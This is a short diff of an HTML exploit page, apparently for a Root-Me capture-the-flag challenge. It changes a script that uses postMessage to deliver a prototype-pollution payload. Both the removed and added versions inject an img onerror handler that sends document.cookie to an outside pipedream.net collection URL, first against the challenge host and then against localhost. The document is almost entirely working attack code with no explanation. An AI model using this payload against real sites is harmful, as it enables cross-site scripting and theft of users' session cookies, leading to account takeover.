@@ -4,14 +4,10 @@
     <title>tmp</title>
 </head>
 <body>
-    <script>
-       window.onload = function() {
-            const target = window.open('http://node1.challenges.ctf20k.root-me.org:38325/');
-
-           setTimeout(() => {
-                target.postMessage('{"__proto__":{"urgentMessage":"<img src=x onerror=location=\'https://eotqkw100h253ph.m.pipedream.net/?c=\'+document.cookie>"}}', '*');
-            }, 1000);
-        };
+   <script>
+        setTimeout(() => {
+            window.postMessage('{"__proto__":{"urgentMessage":"<img src=x onerror=fetch(\'https://eotqkw100h253ph.m.pipedream.net/?c=\'+document.cookie)>"}}', 'http://127.0.0.1:3000');
+        }, 500);
     </script>
 </body>
 </html>
